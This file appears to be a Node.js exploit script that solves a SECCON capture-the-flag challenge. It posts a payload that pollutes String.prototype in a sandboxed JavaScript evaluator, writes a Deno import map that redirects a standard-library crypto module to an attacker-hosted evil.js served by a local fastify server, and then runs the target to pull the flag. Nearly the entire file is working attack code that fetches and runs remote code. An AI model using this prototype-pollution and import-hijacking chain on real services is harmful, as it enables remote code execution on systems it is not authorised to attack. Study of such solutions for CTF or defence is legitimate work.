const fastify = require("fastify")();
const fs = require("node:fs");

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const SECCON_BASE_URL =
  process.env.SECCON_BASE_URL || fail("No SECCON_BASE_URL");
const ATTACK_BASE_URL =
  process.env.ATTACK_BASE_URL || fail("No ATTACK_BASE_URL");

const LISTEN_PORT = process.env.PORT || "8080";

const sleep = (msec) => new Promise((resolve) => setTimeout(resolve, msec));

const source = `
  output.importMap = input.importMap;
  output.imports = input.imports;
  "".constructor.prototype.replaceAll = "".constructor.raw;
  "".constructor.prototype.raw = input.filename;

  input.key = output;
`;

const importMapJson = JSON.stringify({
  filename: "import_map",
  imports: {
    "https://deno.land/std@0.161.0/crypto/mod.ts": `${ATTACK_BASE_URL}/evil.js`,
  },
});

const denoJson = JSON.stringify({
  filename: "deno",
  importMap: "import_map.json",
});

const exploit = async () => {
  const path = await (
    await fetch(`${SECCON_BASE_URL}/`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        source,
      }),
    })
  ).text();

  await fetch(`${SECCON_BASE_URL}${path}/run`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      input: importMapJson,
    }),
  });

  await fetch(`${SECCON_BASE_URL}${path}/run`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      input: denoJson,
    }),
  });

  const flag = await (
    await fetch(`${SECCON_BASE_URL}${path}/run`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        input: "",
      }),
    })
  ).text();

  console.log(flag);
};

const start = async () => {
  const evilJs = fs.readFileSync("evil.js").toString();
  fastify.get("/evil.js", async (req, reply) => {
    return evilJs;
  });

  fastify.listen(
    { port: LISTEN_PORT, host: "0.0.0.0" },
    async (err, address) => {
      if (err) fail(err);

      await sleep(1000);
      await exploit();
      fastify.close();
    }
  );
};
start();
